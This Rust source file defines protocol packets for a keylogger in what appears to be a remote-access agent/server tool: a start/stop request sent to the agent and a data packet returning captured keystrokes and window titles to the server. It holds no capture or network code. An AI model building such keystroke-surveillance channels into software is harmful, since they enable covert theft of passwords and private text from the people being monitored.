use crate::Packet;
use bincode::{Decode, Encode};

/// Action to perform on the keylogger
#[derive(Debug, Clone, Copy, PartialEq, Eq, Encode, Decode)]
pub enum KeyloggerAction {
    /// Start capturing keystrokes
    Start,
    /// Stop capturing keystrokes
    Stop,
}

/// Request to start or stop the keylogger on the agent
#[derive(Debug, Clone, Encode, Decode, Packet)]
#[packet(code = 0x0D)]
pub struct KeyloggerRequest {
    pub action: KeyloggerAction,
}

impl KeyloggerRequest {
    /// Create a request to start the keylogger
    #[must_use]
    pub fn start() -> Self {
        Self {
            action: KeyloggerAction::Start,
        }
    }

    /// Create a request to stop the keylogger
    #[must_use]
    pub fn stop() -> Self {
        Self {
            action: KeyloggerAction::Stop,
        }
    }
}

/// Keylogger data sent from agent to server
#[derive(Debug, Clone, Encode, Decode, Packet)]
#[packet(code = 0x0E)]
pub struct KeyloggerData {
    /// UTF-8 encoded keystroke data (includes window titles and key labels)
    pub data: Vec<u8>,
}

impl KeyloggerData {
    /// Create a new keylogger data packet
    #[must_use]
    pub fn new(data: Vec<u8>) -> Self {
        Self { data }
    }
}
